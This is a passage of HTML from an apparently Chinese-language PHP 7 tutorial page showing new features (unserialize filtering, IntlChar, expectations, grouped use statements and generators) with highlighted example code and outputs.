style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"allowed_classes\"</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"MyClass\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"MyClass2\"</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 默认接受所有类</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n$data </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> unserialize</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$foo</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">[</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">\"allowed_classes\"</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">=&gt;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">true</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">]);</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">IntlChar</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">新增加的 IntlChar 类旨在暴露出更多的 ICU 功能。这个类自身定义了许多静态方法用于操作多字符集的 unicode 字符。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\nprintf</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'%x'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">IntlChar</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">::</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">CODEPOINT_MAX</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\necho </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">IntlChar</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">::</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">charName</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'@'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\nvar_dump</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">IntlChar</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">::</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">ispunct</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'!'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">));</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">10ffff</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\nCOMMERCIAL AT\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">bool</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">true</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">若要使用此类，请先安装Intl扩展</span></p><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">预期</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">预期是向后兼用并增强之前的 assert() 的方法。 它使得在生产环境中启用断言为零成本，并且提供当断言失败时抛出特定异常的能力。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\nini_set</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'assert.exception'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">class</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">CustomError</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">extends</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">AssertionError</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">assert</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">false</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">new</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">CustomError</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'Some error message'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">));</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Fatal</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> error</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">:</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Uncaught</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">CustomError</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">:</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">Some</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> error message</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">use 加强</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">从同一 namespace 导入的类、函数和常量现在可以通过单个 use 语句 一次性导入了。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">//  PHP 7 之前版本用法</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\ClassA</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\ClassB</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\ClassC </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">as</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> C</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\fn_a</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\fn_b</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\fn_c</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">const</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\ConstA</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">const</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\ConstB</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">const</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\ConstC</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// PHP 7+ 用法</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\{</span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">ClassA</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">ClassB</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">ClassC</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">as</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> C</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">};</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\{fn_a</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> fn_b</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> fn_c</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">};</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">use</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">const</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> some\\namespace\\{</span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">ConstA</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">ConstB</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"typ\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,0,102);\">ConstC</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">};</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">?&gt;</span></span></pre><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">Generator 加强</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">增强了Generator的功能，这个可以实现很多先进的特性</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> gen</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">()</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">yield</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">yield</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">;</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\n    </span><span class=\"kwd\" 